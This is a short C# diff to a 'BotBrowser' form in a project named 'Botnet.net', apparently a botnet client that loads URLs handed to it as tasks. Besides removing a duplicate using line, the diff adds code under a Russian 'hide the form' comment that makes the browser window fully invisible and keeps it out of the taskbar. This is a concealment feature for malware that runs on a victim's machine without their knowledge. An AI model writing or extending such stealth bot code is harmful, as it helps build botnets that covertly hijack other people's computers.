@@ -4,7 +4,6 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Threading;
-using System.Threading;
 using System.Windows.Forms;
 
 namespace Botnet.net
@@ -16,6 +15,12 @@ namespace Botnet.net
         public BotBrowser(BotLib.Task task)
         {
             InitializeComponent();
+
+            //Скрываем форму
+            this.Opacity = 0.0;
+            this.ShowIcon = false;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.ShowInTaskbar = false;
 
             this.Browser.Url = task.Uri;
 
